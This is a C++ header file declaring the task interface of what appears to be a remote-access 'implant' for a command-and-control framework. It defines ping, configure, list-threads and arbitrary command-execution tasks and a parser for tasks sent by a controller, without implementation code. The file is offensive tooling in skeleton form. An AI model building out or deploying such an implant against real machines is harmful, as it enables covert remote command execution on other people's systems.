#pragma once

#define _SILENCE_CXX17_C_HEADER_DEPRECATION_WARNING

#include "results.h"

#include <variant>
#include <string>
#include <string_view>

#include <boost/uuid/uuid.hpp>
#include <boost/property_tree/ptree.hpp>


// Define implant configuration
struct Configuration {
	Configuration(double meanDwell, bool isRunning);
	const double meanDwell;
	const bool isRunning;
};


// Tasks
// ===========================================================================================

// PingTask
// -------------------------------------------------------------------------------------------
struct PingTask {
	PingTask(const boost::uuids::uuid& id);
	constexpr static std::string_view key{ "ping" };
	[[nodiscard]] Result run() const;
	const boost::uuids::uuid id;
};


// ConfigureTask
// -------------------------------------------------------------------------------------------
struct ConfigureTask {
	ConfigureTask(const boost::uuids::uuid& id,
		double meanDwell,
		bool isRunning,
		std::function<void(const Configuration&)> setter);
	constexpr static std::string_view key{ "configure" };
	[[nodiscard]] Result run() const;
	const boost::uuids::uuid id;
private:
	std::function<void(const Configuration&)> setter;
	const double meanDwell;
	const bool isRunning;
};


// ExecuteTask
// -------------------------------------------------------------------------------------------
struct ExecuteTask {
	ExecuteTask(const boost::uuids::uuid& id, std::string command);
	constexpr static std::string_view key{ "execute" };
	[[nodiscard]] Result run() const;
	const boost::uuids::uuid id;

private:
	const std::string command;
};


// ListThreadsTask
// -------------------------------------------------------------------------------------------
struct ListThreadsTask {
	ListThreadsTask(const boost::uuids::uuid& id, std::string processId);
	constexpr static std::string_view key{ "list-threads" };
	[[nodiscard]] Result run() const;
	const boost::uuids::uuid id;
private:
	const std::string processId;
};

// ===========================================================================================

// REMEMBER: Any new tasks must be added here too!
using Task = std::variant<PingTask, ConfigureTask, ExecuteTask, ListThreadsTask>;

[[nodiscard]] Task parseTaskFrom(const boost::property_tree::ptree& taskTree,
	std::function<void(const Configuration&)> setter);
